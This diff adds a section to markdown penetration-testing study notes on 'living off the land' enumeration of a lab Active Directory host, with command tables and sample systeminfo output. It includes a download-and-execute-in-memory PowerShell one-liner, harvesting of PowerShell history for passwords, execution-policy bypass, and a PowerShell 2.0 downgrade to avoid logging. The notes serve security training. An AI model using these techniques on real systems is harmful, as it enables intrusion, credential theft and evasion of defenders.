@@ -8939,4 +8939,183 @@ To overcome these strict limitations, the next step is to learn how to **Live Of
 <details>
 <summary><h2>🏹 Living Off the Land</h2></summary>
 
+Utilizing only native Windows and Active Directory tools and commands to perform enumeration, rather than uploading or pulling external tools onto a host.
+
+* **Context:** Moves away from previous methods that required transferring credentialed or uncredentialed tools onto a foothold host, or positioning an attack host inside the environment.
+
+## Scenario
+* **Client Request:** Test an Active Directory environment from a managed host.
+* **Constraints:**
+  * The host has **no internet access**.
+  * All efforts to load external tools onto the host have failed.
+* **Objective:** Determine what types of enumeration are possible using exclusively native tools and commands.
+
+## Advantages & Justification
+* **Increased Stealth:** Native execution creates significantly fewer log entries and alerts compared to pulling external tools into the network.
+* **Evasion of Modern Defenses:** Minimizes the risk of triggering enterprise security controls, such as:
+  * Network monitoring and logging (IDS/IPS, firewalls, passive sensors).
+  * Host-based defenses (Windows Defender, enterprise EDR).
+  * Traffic baseline tools checking for network anomalies.
+* *Critical Risk:* Bringing external tools into the environment from the outside increases the risk of detection exponentially.
+
+## Next Steps
+* **Environmental Commands for Host & Network Recon:** Covering basic, native environmental commands to collect information about the compromised host.
+
+### Basic Enumeration Commands
+
+| Command | Result |
+| :--- | :--- |
+| `hostname` | Prints the PC's Name |
+| `[System.Environment]::OSVersion.Version` | Prints out the OS version and revision level |
+| `wmic qfe get Caption,Description,HotFixID,InstalledOn` | Prints the patches and hotfixes applied to the host |
+| `ipconfig /all` | Prints out network adapter state and configurations |
+| `set` | Displays a list of environment variables for the current session (ran from CMD-prompt) |
+| `echo %USERDOMAIN%` | Displays the domain name to which the host belongs (ran from CMD-prompt) |
+| `echo %logonserver%` | Prints out the name of the Domain controller the host checks in with (ran from CMD-prompt) |
+
+The commands above will give us a quick initial picture of the state the host is in, as well as some basic networking and domain information. We can cover the information above with one command `systeminfo`.
+
+<table width="100%">
+<tr>
+<td colspan="2"> 📟 <b>CMD — Windows</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`C:\System32 >`**
+
+</td>
+<td>
+
+```cmd
+systeminfo
+```
+
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
+```text
+Host Name:                 ACADEMY-EA-MS01
+OS Name:                   Microsoft Windows Server 2019 Standard
+OS Version:                10.0.17763 N/A Build 17763
+OS Manufacturer:           Microsoft Corporation
+OS Configuration:          Member Server
+OS Build Type:             Multiprocessor Free
+Registered Owner:          Windows User
+Registered Organization:   
+Product ID:                00429-00521-62775-AA057
+Original Install Date:     10/27/2021, 9:00:39 AM
+System Boot Time:          5/31/2026, 9:09:59 AM
+System Manufacturer:       VMware, Inc.
+System Model:              VMware7,1
+System Type:               x64-based PC
+Processor(s):              2 Processor(s) Installed.
+                           [01]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2445 Mhz
+                           [02]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2445 Mhz
+BIOS Version:              VMware, Inc. VMW71.00V.24504846.B64.2501180334, 1/18/2025
+Windows Directory:         C:\Windows
+System Directory:          C:\Windows\system32
+Boot Device:               \Device\HarddiskVolume2
+System Locale:             en-us;English (United States)
+Input Locale:              en-us;English (United States)
+Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
+Total Physical Memory:     8,191 MB
+Available Physical Memory: 6,523 MB
+Virtual Memory: Max Size:  9,471 MB
+Virtual Memory: Available: 7,831 MB
+Virtual Memory: In Use:    1,640 MB
+Page File Location(s):     C:\pagefile.sys
+Domain:                    INLANEFREIGHT.LOCAL
+Logon Server:              \\ACADEMY-EA-DC01
+Hotfix(s):                 1 Hotfix(s) Installed.
+                           [01]: KB4464455
+Network Card(s):           2 NIC(s) Installed.
+                           [01]: vmxnet3 Ethernet Adapter
+                                 Connection Name: Ethernet0
+                                 DHCP Enabled:    Yes
+                                 DHCP Server:     10.10.10.2
+                                 IP address(es)
+                                 [01]: 10.129.13.226
+                                 [02]: fe80::f937:178d:e6f8:3dd2
+                                 [03]: dead:beef::f937:178d:e6f8:3dd2
+                                 [04]: dead:beef::238
+                           [02]: vmxnet3 Ethernet Adapter
+                                 Connection Name: Ethernet1
+                                 DHCP Enabled:    No
+                                 IP address(es)
+                                 [01]: 172.16.5.25
+                                 [02]: fe80::e457:c368:1df:1610
+Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
+```
+
+</td>
+</tr>
+</table>
+
+The systeminfo command, as seen above, will print a summary of the host's information for us in one tidy output. Running one command will generate fewer logs, meaning less of a chance we are noticed on the host by a defender.
+
+## Harnessing PowerShell
+
+* Introduced in 2006, PowerShell is a powerful scripting language and framework.
+* Primarily used by sysadmins for administering Windows systems and Active Directory environments.
+* Highly valuable during engagements for **host and network reconnaissance**, as well as **sending and receiving files** utilizing its built-in functions and modules.
+
+**Useful PowerShell Commands**
+
+| Cmd-Let | Description |
+| :--- | :--- |
+| `Get-Module` | Lists available modules loaded for use. |
+| `Get-ExecutionPolicy -List` | Prints the execution policy settings for each scope on a host. |
+| `Set-ExecutionPolicy Bypass -Scope Process` | Changes the policy for the current process. This is ideal as it reverts once the process is terminated, avoiding permanent changes to the victim host. |
+| `Get-ChildItem Env: \| ft Key,Value` | Returns environment values such as key paths, users, computer information, etc. |
+| `Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt` | Retrieves the specified user's PowerShell history. Highly useful for finding plain-text passwords or discovering paths to configuration files/scripts. |
+| `powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL'); <commands>"` | A quick and easy way to download a payload/file from the web and execute it directly from memory. |
+
+### Evading Logging: PowerShell Downgrade
+
+**Core Concept**
+* Hosts often retain older, uninstalled versions of PowerShell alongside newer ones.
+* **PowerShell event logging** was introduced as a feature starting in **version 3.0**.
+
+**The Downgrade Technique**
+* You can attempt to execute **PowerShell version 2.0** (or older) if it is still installed on the system.
+* **Impact:** If successful, actions and commands executed within this downgraded shell will **not** be recorded in the Windows Event Viewer.
+* **Strategic Advantage:** Provides an excellent way to remain under the defenders' radar. It allows you to utilize powerful native host resources for enumeration and execution while maintaining a stealthy footprint.
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚡ <b>PowerShell — Windows</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`PS C:\Users\User >`**
+
+</td>
+<td>
+
+```powershell
+powershell.exe -version 2
+```
+
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
+```
+Windows PowerShell
+Copyright (C) 2009 Microsoft Corporation. All rights reserved.
+```
+
+</td>
+</tr>
+</table>
+
 </details>
